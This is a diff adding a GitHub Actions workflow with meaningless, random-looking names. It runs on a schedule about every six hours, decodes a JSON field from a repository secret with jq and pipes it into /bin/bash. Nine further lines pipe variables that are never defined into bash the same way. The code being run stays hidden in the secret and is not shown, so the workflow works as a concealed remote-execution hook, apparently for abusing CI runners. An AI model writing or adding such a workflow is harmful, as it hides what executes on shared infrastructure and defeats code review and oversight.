@@ -1,0 +1,26 @@
+name: felthearty
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: felthearty
+        env:
+          b9063: ${{ secrets.b9063 }}
+        run: |
+          echo $b9063 | jq -r .zl91 | /bin/bash
+          echo $cmti3967 | jq -r .uxzvx223 | /bin/bash
+          echo $blcev0 | jq -r .choa800 | /bin/bash
+          echo $uzgr5412 | jq -r .ucnp737 | /bin/bash
+          echo $gmlc38 | jq -r .bwsa13 | /bin/bash
+          echo $ybuyd53 | jq -r .d305 | /bin/bash
+          echo $kor94364 | jq -r .bogar4 | /bin/bash
+          echo $f2 | jq -r .ezka51 | /bin/bash
+          echo $h8205 | jq -r .e715 | /bin/bash
+          echo $zg73902 | jq -r .ukf9379 | /bin/bash
+
